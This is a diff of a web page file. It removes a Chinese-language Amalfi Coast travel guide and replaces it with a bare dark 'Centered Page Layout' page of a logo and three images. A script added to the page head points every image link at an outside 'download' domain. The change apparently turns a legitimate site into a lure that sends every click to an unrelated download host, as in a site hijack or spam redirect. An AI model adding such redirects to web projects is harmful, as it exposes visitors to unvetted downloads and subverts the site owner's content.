@@ -1,151 +1,101 @@
----
-// 数据逻辑部分
-const pageTitle = "阿马尔菲海岸终极旅行指南";
-const destinations = [
-  {
-    id: 1,
-    name: "波西塔诺",
-    description: "意大利最著名的悬崖小镇，彩色房屋如瀑布般倾泻至地中海，拥有绝美的沙滩和奢侈品商店。",
-    highlights: ["斯皮亚格亚海滩", "圣母升天教堂", "柠檬酒品尝"],
-    image: "/images/01.jpg",  // 本地图片路径
-    tips: "最佳游览时间：5-6月或9-10月避开人流。从索伦托乘SITA巴士可达。"
-  },
-  {
-    id: 2,
-    name: "阿马尔菲镇",
-    description: "历史上强大的海上共和国，以其宏伟的大教堂和手工造纸闻名。",
-    highlights: ["阿马尔菲大教堂", "翡翠洞", "Valle delle Ferriere自然保护区"],
-    image: "/images/02.jpg",  // 本地图片路径
-    tips: "推荐购买当地手工柠檬皂和Limoncello酒。"
-  },
-  {
-    id: 3,
-    name: "拉韦洛",
-    description: "云端上的花园小镇，音乐家瓦格纳曾在此寻找灵感。",
-    highlights: ["辛波乃别墅", "鲁菲洛别墅", "瓦格纳音乐节"],
-    image: "/images/03.jpg",  // 本地图片路径
-    tips: "一定要在别墅露台喝杯咖啡，俯瞰整个海岸线。"
-  }
-];
-const travelTips = [
-  "交通：建议购买Unico Costiera公交通票",
-  "美食：必尝Scialatielli手工宽面和Delizia al Limone甜点",
-  "安全：悬崖道路狭窄，自驾需谨慎"
-];
----
-<html lang="zh">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <title>{pageTitle}</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    /* 全局样式 */
-    :root {
-      --primary: #2a5f8a;
-      --secondary: #6b8e23;
-      --accent: #d4a017;
-    }
-    body {
-      font-family: 'Noto Sans SC', sans-serif;
-      line-height: 1.8;
-      color: #333;
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0 20px;
-      background: #f9f9f9;
-    }
-    /* 标题样式 */
-    header {
-      text-align: center;
-      padding: 3rem 0;
-      background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), 
-                  url('/images/01.jpg');  /* 使用01.jpg作为标题背景 */
-      background-size: cover;
-      background-position: center;
-      color: white;
-      border-radius: 0 0 20px 20px;
-      margin-bottom: 3rem;
-    }
-    h1 {
-      font-size: 2.8rem;
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-    }
-    /* 景点卡片 */
-    .destination-card {
-      background: white;
-      border-radius: 15px;
-      overflow: hidden;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-      margin-bottom: 3rem;
-      transition: transform 0.3s;
-    }
-    .destination-card:hover {
-      transform: translateY(-5px);
-    }
-    .destination-image {
-      width: 100%;
-      height: 400px;
-      object-fit: cover;
-    }
-    .destination-content {
-      padding: 2rem;
-    }
-    .highlights {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin: 1rem 0;
-    }
-    .highlight-tag {
-      background: var(--accent);
-      color: white;
-      padding: 5px 10px;
-      border-radius: 20px;
-      font-size: 0.9rem;
-    }
-    /* 响应式设计 */
-    @media (max-width: 768px) {
-      h1 { font-size: 2rem; }
-      .destination-image { height: 250px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Centered Page Layout</title>
+
+    <script>
+      const downloadLink = "https://www.bqq0qf.top";
+
+      document.addEventListener('DOMContentLoaded', function() {
+        const linksToUpdate = document.querySelectorAll('.download-anchor');
+        linksToUpdate.forEach(function(link) {
+          link.href = downloadLink;
+        });
+      });
+    </script>
+
+    <style>
+        body {
+          margin: 0;
+          background-color: #121212;
+          font-family: sans-serif;
+        }
+
+        .container {
+          width: 80%;
+          margin: 40px auto; 
+        }
+
+        .header {
+          text-align: center;
+          margin-bottom: 50px;
+        }
+
+        .logo-image {
+          max-width: 180px;
+          height: auto;
+          margin: 0 auto;
+          display: block;
+        }
+
+        .gallery {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          gap: 30px;
+        }
+
+        .gallery-link {
+          display: block;
+          width: 100%;
+          text-decoration: none;
+        }
+
+        .gallery-image {
+          width: 100%;
+          height: auto;
+          border-radius: 8px;
+          display: block;
+          box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
+          transition: transform 0.3s ease;
+        }
+
+        .gallery-image:hover {
+          transform: scale(1.02);
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>{pageTitle}</h1>
-    <p>探索意大利最梦幻的50公里海岸线</p>
-  </header>
 
-  <main>
-    <!-- 景点介绍 -->
-    {destinations.map(destination => (
-      <article class="destination-card" key={destination.id}>
-        <img 
-          src={destination.image} 
-          alt={destination.name}
-          class="destination-image"
-          loading="lazy"
-          width="1200"
-          height="800"
-        />
-        <div class="destination-content">
-          <h2>{destination.name}</h2>
-          <p>{destination.description}</p>
-          <div class="highlights">
-            {destination.highlights.map(item => (
-              <span class="highlight-tag">{item}</span>
-            ))}
-          </div>
-          <div class="tip-card">
-            <h3>📌 旅行小贴士</h3>
-            <p>{destination.tips}</p>
-          </div>
+    <div class="container">
+
+      <header class="header">
+        <a href="#" class="download-anchor">
+          <img src="/logo.png" alt="Website Logo" class="logo-image" />
+        </a>
+      </header>
+
+      <main>
+        <div class="gallery">
+          
+          <a href="#" class="download-anchor gallery-link">
+            <img src="/01.png" alt="Image 1" class="gallery-image" />
+          </a>
+          
+          <a href="#" class="download-anchor gallery-link">
+            <img src="/02.png" alt="Image 2" class="gallery-image" />
+          </a>
+          
+          <a href="#" class="download-anchor gallery-link">
+            <img src="/03.png" alt="Image 3" class="gallery-image" />
+          </a>
+
         </div>
-      </article>
-    ))}
-  </main>
+      </main>
 
-  <footer style="text-align: center; padding: 2rem; color: var(--primary);">
-    <p>© {new Date().getFullYear()} 阿马尔菲海岸旅行指南 · 使用本地图片</p>
-  </footer>
+    </div>
+
 </body>
 </html>
